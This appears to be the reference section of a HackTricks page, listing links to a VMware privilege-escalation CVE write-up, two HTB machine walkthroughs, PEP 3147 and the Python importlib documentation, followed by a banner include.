- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
- [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [Python importlib docs](https://docs.python.org/3/library/importlib.html)

{{#include ../../banners/hacktricks-training.md}}
